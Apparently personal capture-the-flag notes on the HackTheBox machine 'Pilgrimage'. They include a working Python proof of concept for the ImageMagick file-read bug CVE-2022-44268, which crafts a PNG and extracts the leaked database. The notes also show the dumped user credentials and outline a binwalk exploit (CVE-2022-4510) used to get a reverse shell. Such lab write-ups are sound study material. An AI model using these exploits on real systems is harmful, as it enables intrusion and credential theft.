dumped git file repo with git-dumper

arb file read vuln

grabbed sqlite db with python script

https://github.com/kljunowsky/CVE-2022-44268

Upload poisoned file, got sqlite db with: `python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/65bd760f22482.png`


modified script below:
```python
import argparse
import requests
import io
from PIL import Image, PngImagePlugin

def main():
    if args.url:
        headers = {'User-Agent': 'Shift Security Consulting https://shiftsecurityconsulting.com - CVE-2022-44268'}
        response = requests.get(args.url)
        img = Image.open(io.BytesIO(response.content))

        # Extract the raw profile type from the image metadata
        raw_profile_type = img.info.get('Raw profile type', '').split("\n")[3:]
        raw_profile_type_stipped = "\n".join(raw_profile_type)

        # Decrypt the raw profile type from hex format
        decrypted_profile_type = bytes.fromhex(raw_profile_type_stipped)

        with open("output.sqlite", "wb+") as out:
            out.write(decrypted_profile_type)

        # Print the decrypted profile type
        print(decrypted_profile_type)
    
    elif args.image:
        # Open the image file
        img = Image.open(args.image)

        # Create a PngInfo object and add the text
        info = PngImagePlugin.PngInfo()
        info.add_text('profile', args.file_to_read, zip=False)

        # Save the modified image to a new file
        img.save(args.output, 'PNG', pnginfo=info)

    else:
        print('Proof of Concept Exploit for CVE-2022-44268 by Milan Jovic - https://shiftsecurityconsulting.com\nUse -h for help')
    



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Proof of Concept Exploit for CVE-2022-44268 by Milan Jovic - https://shiftsecurityconsulting.com')
    parser.add_argument('--url', help='The URL of the uploaded PNG image')
    parser.add_argument('--image', help='Input PNG file')
    parser.add_argument('--file-to-read', help='File to read')
    parser.add_argument('--output', help='Output PNG file')
    args = parser.parse_args()
    if not vars(args):
        parser.print_help()
    main()

```

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

sqlite3 output.sqlite
SQLite version 3.44.2 2023-11-24 11:41:44
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
INSERT INTO users VALUES('emily','abigchonkyboi123');
CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL);
COMMIT;

/usr/bin/gettext.sh
/usr/sbin/malwarescan.sh

malwarescan uses binwalk to parse files, exploited a vuln in it to get a reverse shell.

revshells.com

https://github.com/adhikara13/CVE-2022-4510-WalkingPath

scp's malicious image over to box to /var/www/pilgrimage.htb/shrunk/

